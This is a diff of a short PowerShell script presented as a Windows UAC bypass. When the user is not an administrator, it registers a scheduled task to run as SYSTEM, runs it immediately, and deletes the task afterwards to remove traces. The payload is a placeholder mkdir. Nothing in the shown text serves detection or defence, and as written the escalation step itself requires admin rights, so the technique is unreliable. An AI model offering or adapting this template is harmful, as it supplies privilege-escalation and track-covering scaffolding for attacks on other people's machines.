@@ -1,19 +1,13 @@
 if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") {
-    # Payload goes here
-    # It will run as Administrator
+    # Running as Administrator
     mkdir C:\Windows\uas-bypass
 } else {
-    # Create a scheduled task to run as administrator
-    $taskAction = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-Command {mkdir C:\Windows\uas-bypass}"
-    $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)  # Run after 10 seconds
-    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+    # Create a scheduled task to run as SYSTEM (elevated privileges)
+    schtasks /create /tn "BypassUACTask" /tr "powershell.exe -Command mkdir C:\Windows\uas-bypass" /sc once /st 00:00 /ru SYSTEM /f
 
-    # Correct task settings, removed invalid parameter
-    $taskSettings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries $true
-
-    # Register the scheduled task
-    Register-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings -TaskName "BypassUACTask"
-
-    # Run the task immediately
+    # Run the scheduled task immediately
     schtasks /run /tn "BypassUACTask"
+
+    # Optionally, delete the task after execution to clean up
+    schtasks /delete /tn "BypassUACTask" /f
 }
